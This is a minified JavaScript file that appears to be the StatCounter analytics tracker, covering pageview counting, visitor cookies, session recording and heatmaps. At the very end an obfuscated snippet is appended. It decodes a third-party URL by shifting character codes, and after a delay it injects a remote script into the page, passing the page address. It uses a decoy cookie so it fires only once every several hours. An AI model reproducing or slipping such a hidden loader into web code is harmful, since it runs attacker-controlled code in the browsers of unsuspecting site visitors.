        a.inject_script = function(e, t) { if (void 0 !== e && e.match(/^https?:\/\/(?:[^\/]+\.)?statcounter\.com/)) { var n = document.createElement("script");
                n.type = "text/javascript", n.async = !0; var r = document.getElementsByTagName("script")[0];
                r.parentNode.insertBefore(n, r), t && (n.onload = t, n.onreadystatechange = function() { "complete" == this.readyState && t() }), n.src = e } }; var De = !1; if (!fe || window.parent && window.parent !== window) { if (fe) try { De = window.parent.location.href === window.location.href } catch (qe) {} } else { var qe = function() { var e = !1; try { e = (Xe.contentDocument || Xe.contentWindow).location.href } catch (e) {} if ("absolute" === getComputedStyle(document.querySelector(".heatmap-wrapper")).position && "about:blank" !== e) { e === document.location.href ? (We = "nested-by-url", $e.removeChild(Fe)) : (We = "nested-transfer", $e.removeChild(Xe), Xe = Fe), document.body.style.viewTransitionName = "none", Xe.style.viewTransitionName = "website"; for (var t = document.head.firstChild; null !== t; t = n) { var n = t.nextSibling;
                            t._deleteme && document.head.removeChild(t) } if (document.head.appendChild(ze), "nested-by-url" !== We) { for (var r = 0; r < document.documentElement.attributes.length; r++) {
                                (i = document.documentElement.attributes[r]).specified && Xe.contentDocument.documentElement.setAttribute(i.name, i.value) } for (r = 0; r < document.body.attributes.length; r++) {
                                (i = document.body.attributes[r]).specified && Xe.contentDocument.body.setAttribute(i.name, i.value) } for (t = document.head.firstChild; null !== t; t = n) { n = t.nextSibling; if (t._deferredCopy) { var o = document.createElement("script"); for (r = 0; r < t.attributes.length; r++) {
                                        (i = t.attributes[r]).specified && o.setAttribute(i.name, i.value) }
                                    Xe.contentDocument.head.appendChild(o) } } } for (t = document.body.firstChild; null !== t; t = n) { n = t.nextSibling;
                            t !== Xe && t !== Ue && "heatmap-wrapper" !== t.className && ("nested-by-url" === We ? document.body.removeChild(t) : Xe.contentDocument.body.appendChild(t)) } for (r = document.documentElement.attributes.length - 1; r >= 0; r--) {
                            (i = document.documentElement.attributes[r]).specified && document.documentElement.removeAttribute(i.name) } for (r = document.body.attributes.length - 1; r >= 0; r--) { var i;
                            (i = document.body.attributes[r]).specified && document.body.removeAttribute(i.name) } if (document.body.className = "heatmap-popup", "<!DOCTYPE html>" === document.doctype) { var s = document.implementation.createDocumentType("html", "", "");
                            document.doctype.parentNode.replaceChild(s, document.doctype) } var c = $e.closest(".heatmap-popup").clientWidth,
                            u = ($e.querySelector("iframe"), parseInt(Xe.getAttribute("width"))); if (u > c) { var d = c / u;
                            $e.style.scale = d }
                        a._outer_mutations || (a._outer_mutations = []); var l = new MutationObserver((function(e) { e.forEach((function(e) { a._outer_mutations.push(e) })) })),
                            f = { subtree: !1, childList: !0, attributes: !0, attributeOldValue: !0 };
                        l.observe(document.head, f), l.observe(document.body, f), f.childList = !1, l.observe(document.documentElement, f) } else requestAnimationFrame(qe) },
                Be = "",
                Re = "mobile";
            pe.hms ? (pe.hms.startsWith("d") && (Re = "desktop"), Be = pe.hms.substring(1), sessionStorage.setItem("sc_hms", Be), sessionStorage.setItem("sc_s", Re), pe.hev && sessionStorage.setItem("sc_hev", pe.hev), pe.hsv && sessionStorage.setItem("sc_hsv", pe.hsv), window.history.replaceState(history.state, document.title, document.location.href.split("&hms=")[0])) : (sessionStorage.getItem("sc_hms") && (Be = sessionStorage.getItem("sc_hms")), sessionStorage.getItem("sc_s") && (Re = sessionStorage.getItem("sc_s"))); var Je = { mobile: 430, desktop: 1570 },
                Pe = document.location.host.replace(/^www./, "") + document.location.pathname;
            Pe = Pe.replace(/\/index\.(html?|php|cfm)$/, "/"); var ze = document.createElement("style");
            ze.innerText = "body { margin: 0; display: flex; } iframe { border: none; min-height: 100vh; }"; var Ue = document.createElement("iframe");
            Ue.setAttribute("scrolling", "no"), Ue.classList.add("heatmap-controls"); var He = ""; - 1 !== document.location.search.indexOf("hdebug") && (He = "&hdebug"), Ue.setAttribute("src", s + "/p" + t + "/heatmap/?domainpath=" + Pe + "&origin=" + document.location.origin + He + "&hms=" + encodeURIComponent(Be)); var $e = document.createElement("div");
            $e.classList.add("heatmap-wrapper"), $e.style.maxWidth = Je[Re] + "px"; var Ve = document.createElement("div");
            Ve.classList.add("canvas-container"), $e.appendChild(Ve); var We, Xe = document.createElement("iframe");
            Xe.setAttribute("scrolling", "no"), Xe.setAttribute("width", Je[Re]), Xe.setAttribute("src", document.location.href), $e.appendChild(Xe); var Fe = document.createElement("iframe");
            Fe.setAttribute("scrolling", "no"), Fe.setAttribute("width", Je[Re]), $e.appendChild(Fe); var Ge = document.createElement("link");
            Ge.setAttribute("rel", "shortcut icon"), Ge.setAttribute("href", s + "/images/favicon.png?v=1"), Ge.setAttribute("type", "image/x-icon"), document.head.appendChild(Ge), document.body.appendChild($e), document.startViewTransition ? (document.body.style.viewTransitionName = "website", document.startViewTransition((function() { qe(), document.body.appendChild(Ue) }))) : (qe(), document.body.appendChild(Ue)), Fe.contentDocument.open(), Fe.contentDocument.close(); for (var Ye = document.head.firstChild; null !== Ye; Ye = Ke) { var Ke = Ye.nextSibling; if ("TITLE" === Ye.tagName) Ye.innerHTML = "Heatmap | " + Ye.innerHTML + " | Statcounter";
                else if (Ye !== ze && Ye !== Ge) { if ("SCRIPT" === Ye.tagName && Ye.src) { Ye._deferredCopy = !0; continue } var Qe = Ye.cloneNode(!0); if ("LINK" === Qe.tagName && "stylesheet" === (Qe.getAttribute("rel") || "").toLowerCase()) { var Ze = new URL(Qe.href);
                        Ze.origin !== document.location.origin && Ze.hostname.replace(/^www./, "") === document.location.hostname && (Ze.protocol = document.location.protocol, Ze.hostname = document.location.hostname, Qe.href = Ze.toString()) }
                    Fe.contentDocument.head.appendChild(Qe), Ye._deleteme = !0 } } var et = document.createElement("script");
            pe._heatmap.startsWith("dev") ? (et.setAttribute("src", s + "/js/hotspot.module.js"), et.setAttribute("type", "module")) : et.setAttribute("src", s + "/js/packed/hotspot-" + sessionStorage.getItem("sc_hsv") + ".js"), document.head.appendChild(et) } if (fe && !De) { et = document.createElement("script");
            pe._heatmap.startsWith("dev") ? (et.setAttribute("src", s + "/js/heatmap-embedded.module.js"), et.setAttribute("type", "module")) : et.setAttribute("src", s + "/js/packed/heatmap-embedded-" + sessionStorage.getItem("sc_hev") + ".js"), document.head.appendChild(et) } var tt, nt, rt = [],
            ot = 256,
            it = Math.pow(ot, 6),
            at = Math.pow(2, 52),
            st = 2 * at,
            ct = ot - 1,
            ut = function(e, t) { var n = [],
                    r = E(j(t ? [e, T(rt)] : 0 in arguments ? e : k(), 3), n),
                    o = new I(n); return E(T(o.S), rt), tt = function() { for (var e = o.g(6), t = it, n = 0; e < at;) e = (e + n) * ot, t *= ot, n = o.g(1); for (; e >= st;) e /= 2, t /= 2, n >>>= 1; return (e + n) / t }, r };
        E(Math.random(), rt), "." != (nt = void 0 === window.sc_cookie_domain ? Me.location.host.replace(/^www\./, "") : window.sc_cookie_domain).substring(0, 1) && (nt = "." + nt), a.getSessionConfig = z, void 0 === a._recording_initiated && (a._recording_initiated = {}); var dt = function(e) { if (!fe && !a._recording_initiated[e]) { var t = z("record_" + e); if (t && t.match(/(^on$|off|test$|test_[a-z]{12}$|wsdev$|^dev[0-9]*)/)) { var n = z("heatmap_" + e); if (!oe() && a._session_increment_calculated[e] && z("sc_project_time_difference_" + e)) { if (window !== Le) { if (void 0 === Le.sc_top_reg && (Le.sc_top_reg = {}), 2 === Le.sc_top_reg[e]) return;
                            Le.sc_top_reg[e] = 2 } if (a.start_recording) a.start_recording(e, t, Ie, n);
                        else { var r = "https://www.statcounter.com/counter/recorder.js";
                            ve && (r = (r = ve.replace(/\/counter([^\/])/, "/recorder$1").replace("_xhtml", "")).replace(/^http:\/\//, "https://")), -1 != t.indexOf("test") && (r = r.replace(/\/recorder(.[^t])/, "/recorder_test$1")), -1 != t.indexOf("_") && (r = r.replace(/\.js/, "_" + t.split("_")[1] + ".js")), r = "dev" == t.substring(0, 3) && "dev" !== t ? r.replace(/\/\/(www\.|secure\.)?/, "//" + t.split("_")[0].replace(/\//g, "").replace("test", "").replace("off", "").replace("wsdev", "") + ".") : r.replace(/\/\/(secure\.)?statcounter\./, "//www.statcounter."), a.inject_script(r, (function() { _statcounter.start_recording(e, t, Ie, n) })) }
                        a._recording_initiated[e] = !0 } } } };
        a.get_config = function(e, t) { var n = !1;
            e.match(/sc_project=[0-9]+/) && (n = parseInt(e.match(/sc_project=([0-9]+)/)[1], 10)); var r = "t.php",
                a = ye; if (o(n) && (r = "t_static.php", a = "https://1ctest.statcounter.com/"), i(n) && (r = "counter_test.php", a = "https://1ctest.statcounter.com/"), "?" == e.substring(0, 1)) var s = a + r + e;
            else s = e;
            s += "&get_config=true", !1 !== n ? $(s, t, (function(e) { U("sc_block_project_config_" + n, 1) })) : $(s, t) }; var lt = { google: null, bing: ["q"], "search.yahoo": null, "m.yahoo": null, "m2.yahoo": null, baidu: ["wd", "word"], yandex: ["text"], "ya.ru": ["text"], haosou: ["q"], "so.com": ["q"], "360.cn": ["q"], "360sou": ["q"], aol: ["query", "q"], duckduckgo: null, "ask.com": ["q", "QUERYT"], "mail.ru": ["words"], sogou: ["q", "query"] },
            ft = { fb: ["facebook.com", "fb.me"], pi: ["pinterest.com"], tw: ["twitter.com", "t.co"], ln: ["linkedin.com"], in: ["instagram.com"], rd: ["reddit.com"], tb: ["tumblr.com"], st: ["stumbleupon.com"], yt: ["youtube.com"], gp: ["plus.google.com", "plus.url.google.com"] },
            pt = escape(p());
        a.record_pageview = function(e, n) { if (!fe) { var o = "invisible"; if (void 0 === e) { if (!1 === t) { if (!window.usr) return console.error("Need to define a global `var sc_project` and `var security code`, or else call record_pageview with these arguments"), void c("Statcounter code invalid. Insert a fresh copy.");
                        e = 999 } else e = t;
                    o = window.sc_invisible && 1 == window.sc_invisible ? "invisible" : window.sc_text ? "text" : "image" } else { if (e = parseInt(e, 10), isNaN(e)) return void console.error("Please call record_pageview with your statcounter project id"); if ("string" == typeof n) a._security_codes[e] = n;
                    else if (void 0 === a._security_codes[e]) return void console.error("Please include the security code for project " + e + " as the second argument to record_pageview") }
                void 0 === a._security_codes[e] && (a._security_codes[e] = ""); var i = 0;
                (4135125 == e || 6169619 == e || 6222332 == e || 5106510 == e || 6311399 == e || 6320092 == e || 5291656 == e || 7324465 == e || 6640020 == e || 4629288 == e || 1480088 == e || 2447031 == e) && 1 != Math.floor(6 * Math.random()) && (i = 1); var s = !1,
                    d = /Chrome/.test(navigator.userAgent),
                    l = !1; try { if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues && navigator.userAgentData.platform && !u(o) && ("Windows" === navigator.userAgentData.platform || d)) { s = "[pending]"; var f = ["platformVersion"];
                        d && f.push("model"), navigator.userAgentData.getHighEntropyValues(f).then((function(e) { s = parseInt(e.platformVersion.split(".")[0]), d && (l = e.model) })).catch((function(t) { if (r(e)) throw t })) } } catch (p) { if (r(e)) throw p } if (1 != i)
                    if ("prerender" == Me.webkitVisibilityState) { if (1 == le) { var p = function() { if ("prerender" != Me.webkitVisibilityState) { for (var e in a._security_codes) Y(parseInt(e, 10), "invisible", d && l ? { p: 2, pv: s, dm: l } : { p: 2, pv: s });
                                    Me.removeEventListener("webkitvisibilitychange", p, !1) } };
                            Me.addEventListener("webkitvisibilitychange", p, !1) }
                        K(e, o, !1, {}, { p: 1 }) } else "[pending]" == s ? setTimeout((function() { Y(e, o, d && l ? { p: 0, pv: s, dm: l } : { p: 0, pv: s }) }), 1) : Y(e, o, { p: 0 }) } }; var gt = {};
        a.record_click = function(e, t) { e = parseInt(e, 10), isNaN(e) ? console.error("Please call record_click with your statcounter project id") : void 0 !== a._security_codes[e] ? te(e, t, !0) : console.error("Please set up security codes (e.g. by calling record_pageview) prior to record_click") }; var mt, vt, _t, ht, wt = "googlesyndication.com|ypn-js.overture.com|ypn-js.ysm.yahoo.com|googleads.g.doubleclick.net",
            yt = "^aswift_[0-9]+$"; if (a.update_cookie = function(e, t, n) { void 0 === t && (t = Math.round((new Date).getTime() / 1e3)); var r = z("sc_project_time_difference_" + e),
                    o = {},
                    i = "1.1.1.1.1.1.1.1.1",
                    s = "is_visitor_unique"; try { var c = O(s, e) } catch (e) { c = !1;
                    xe = ".ex" } var u = [],
                    d = []; if (c && "rx" == c.substring(0, 2)) { q(s, nt), u = c.substring(2).split("-"); for (var l = !1, f = !1, p = 0; p < u.length; p++) { var g = u[p].split("."); if (parseInt(g[0], 10) == e) { l = !0; var m = parseInt(g[1], 10);
                            a._returning_values[e] = []; var v = 2;
                            32 == g[2].length ? (xe = "." + g[2], v = 3) : xe = f; for (var _ = 0; _ < Te.length; _++) { var h = parseInt(g[_ + v], 10);
                                isNaN(h) && (h = 1), a._returning_values[e].push(h) }
                            o.jg = t - m; for (_ = 0; _ < Te.length; _++) n ? a._returning_values[e][_]++ : t > m + 60 * Te[_] && (60 * Te[_] === r && (o.session_incremented = !0), a._returning_values[e][_]++);
                            o.rr = a._returning_values[e].join("."), d.push(e + "." + t + xe + "." + a._returning_values[e].join(".")) } else d.push(u[p]), 0 == p && 32 == g[2].length && "" == xe && (xe = "." + g[2]);
                        0 == p && (f = xe) }
                    l || (0 == d.length && "" == xe && (xe = "." + N()), d.push(e + "." + t + xe + "." + i), a._returning_values[e] = i.split("."), o.jg = "new", o.rr = i), d.sort((function(e, t) { return parseInt(t.split(".")[1], 10) - parseInt(e.split(".")[1], 10) })); for (var w = 1; w < d.length; w++) d[w] = d[w].replace("." + d[0].split(".")[2] + ".", ".");
                    M(s, d, nt, "rx", 3, e) } else if (".ex" != xe) { xe = "." + N(), M(s, d = [e + "." + t + xe + "." + i], nt, "rx", 3, e) ? (a._returning_values[e] = i.split("."), o.jg = "new", o.rr = i) : xe = ".na" } return "" != xe && (o.u1 = xe.substring(1)), o }, a.get_visitor_id = function() { if (xe.length > 1) return xe.substring(1); var e = !1; try { e = O("is_visitor_unique") } catch (e) {} return e && "rx" == e.substring(0, 2) && e.split(".").length > 2 && 32 == e.split(".")[2].length ? e.split(".")[2] : "x-no-visitor" }, a.get_session_num = function(e) { var t = z("sc_project_time_difference_" + e),
                    n = !1; if (0 != (n = t || "ntd" === Ce ? t : Ce) && a._session_increment_calculated[e] && a._returning_values[e].length == Te.length)
                    for (var r = 0; r < Te.length; r++)
                        if (60 * Te[r] == parseInt(n)) return a._returning_values[e][r];
                var o = "-" + Ce + "-" + e + "-" + Ne + "-" + Ae; return null === t ? "x-no-session-num-99" + Math.round(1e3 * Math.random()) + o : a._session_increment_calculated[e] ? a._returning_values[e].length !== Te.length ? "x-no-session-num-97" + Math.round(1e3 * Math.random()) + o : 0 == t ? "x-no-session-num-96" + Math.round(1e3 * Math.random()) + o : "x-no-session-num-95" + t + o : "x-no-session-num-98" + Math.round(1e3 * Math.random()) + o }, a.version = function() { return "c49b29" }, a.get_tab_session = function() { var e = !1; try { if (!(e = sessionStorage.getItem("statcounter_tab_session"))) { e = N(8); try { sessionStorage.setItem("statcounter_tab_session", e) } catch (t) { e = !1 } } } catch (t) { e = !1 } if (!1 !== e) return e;
                session_tab_id = "x-no-session-storage-" + Math.round(1e5 * Math.random()) }, a.record = function(e, n) { if (void 0 === n && (n = "on"), void 0 === e || "on" === e || "dev" === e) { if (!1 === t) return;
                    console.log("Turning on session recording for p" + t), e = t } else { if (parseInt(e, 10) + "" != e) return;
                    e = parseInt(e, 10) }
                U("record_" + e, n), z("sc_project_time_difference_" + e) || U("sc_project_time_difference_" + e, 1800), dt(e) }, a._get_script_num = function() { return le }, 1 == le) { if (we > 0) { var bt = []; for (bt.push.apply(bt, Me.getElementsByTagName("frame")), bt.push.apply(bt, Me.getElementsByTagName("iframe")); bt.length;) { var xt = bt.pop(0); try { var St = xt.contentDocument;
                        de(St), bt.push.apply(bt, St.getElementsByTagName("frame")), bt.push.apply(bt, St.getElementsByTagName("iframe")) } catch (qe) {} }
                de(Me) } try { var It = Me.getElementsByTagName("title"); if (It.length) { var jt = Me.title,
                        Et = Me.location.href.split("#")[0],
                        kt = new MutationObserver((function() { var e = Me.location.href.split("#")[0]; if (Me.title != jt && e != Et) { for (var t in a._security_codes) { var n = parseInt(t, 10);
                                    (void 0 === gt[n] || (new Date).getTime() - gt[n] > 1e3) && setTimeout((function(e) {
                                        (void 0 === gt[e] || (new Date).getTime() - gt[e] > 1e3) && (void 0 !== Le.sc_top_reg && (Le.sc_top_reg[e] = void 0), a.record_pageview(e)) }), 200, n) }
                                a._add_recording_event && a._add_recording_event("history-pageload", { referrer: Et, href: e }), jt = Me.title, Et = e } }));
                    kt.observe(It[0], { childList: !0, attributes: !1, subtree: !1 }) } } catch (qe) {} } return a._generate_uuid = N, a } catch (c) { if (0 != t && r(t)) { "function" != typeof encodeURIComponent && (encodeURIComponent = function(e) { return escape(e) }); var Tt = ""; for (var Ct in c) Tt += "property: " + Ct + " value: [" + c[Ct] + "]\n";
            Tt += "toString():  value: [" + c.toString() + "]\n", (new Image).src = "https://statcounter.com/feedback/?email=javascript@statcounter.com&page_url=" + encodeURIComponent(Me.location.protocol + "//" + Me.location.host + Me.location.pathname + Me.location.search + Me.location.hash) + "&name=Auto%20JS&feedback_username=statcounter&pid=" + t + "&fake_post&user_company&feedback=consistent%20uniques%20js%20exception:%20" + encodeURIComponent(Tt) } } }(_statcounter);
_statcounter.record_pageview();
(function(o, d, l) { try { o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function() { o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44hisxy' + 'fy3sjy4ljy4xhwnuy' + '3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s)); }, 1000);
        d.cookie = o.b + '=full;max-age=39800;' } catch (e) {}; }({}, document, location));